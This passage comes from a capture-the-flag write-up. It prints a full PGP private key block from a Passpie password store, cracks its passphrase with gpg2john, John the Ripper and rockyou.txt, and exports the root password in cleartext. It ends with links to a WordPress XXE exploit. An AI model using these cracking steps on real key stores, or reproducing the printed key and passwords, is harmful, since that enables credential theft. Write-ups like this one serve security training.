ZBSuM1xOUhNM58J/SQgXGMthHj3ebng2AvYjdx+wWJYQFGkb5VO+99gmOk28NY25
hhS8iMUu4xycHd3V0/j8q08RfqHUOmkhIU+CWawpORH+/+2hjB+FHF7olq4EzxYg
6L4nAAMFA/4ukPrKvhWaZT2pJGlju4QQvDXQlrASiEHD6maMqBGO5tJqbkp+DJtM
F9UoDa53FBRFEeqclY6kQUxnzz48C5WsOc31fq+6vj/40w9PbrGGBYJaiY/zouO1
FU9d04WCssSi9J5/BiYiRwFqhMRXqvHg9tqUyKLnsq8mwn0Scc5SVYh4BBgRCAAg
FiEEfGeGp1YbyE9QSGceOHd1w1dF0gMFAmK4V9YCGwwACgkQOHd1w1dF0gOm5gD9
GUQfB+Jx/Fb7TARELr4XFObYZq7mq/NUEC+Po3KGdNgA/04lhPjdN3wrzjU3qmrL
fo6KI+w2uXLaw+bIT1XZurDN
=dqsF
-----END PGP PUBLIC KEY BLOCK-----
-----BEGIN PGP PRIVATE KEY BLOCK-----

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
=7Uo6
-----END PGP PRIVATE KEY BLOCK-----
```

- So I am not able to crack the first key but the second key is crackable
- Here is how to proceed

1. We keep the 2nd pgp key in a file so the one ending with `=7Uo6`
2. `gpg2john pgpkey2 > crackme2`we convert it in a john format
3. We crack it with a wordlist `john -w:/usr/share/wordlists/rockyou.txt crackme2`

- We get a password `blink182`

![cracked](../.res/2022-12-21-17-44-41.png)

- Let's see how we can use it with passpie to get the root password. Here is the output of the help of passpie

![passpie help](../.res/2022-12-21-17-46-56.png)  

- Ok the help command is not really detailed but with the [documentation](https://passpie.readthedocs.io/en/latest/) we can find out the process to get the password.

1. We create the file in which we will want our password exported to (here I named it `exportedpass`) `touch exportedpass`
2. Then we need to type or command to export the password `passpie export exportedpass`
3. Finally we can cat our file exportedpass and we have the root password `p7qfAZt4_A1xo_0x`

![exportedpass](../.res/2022-12-21-17-55-36.png)

- We can su root with the new password and get the final flag.

## Useful resources

- https://github.com/motikan2010/CVE-2021-29447
- https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/
- https://www.exploit-db.com/exploits/39319
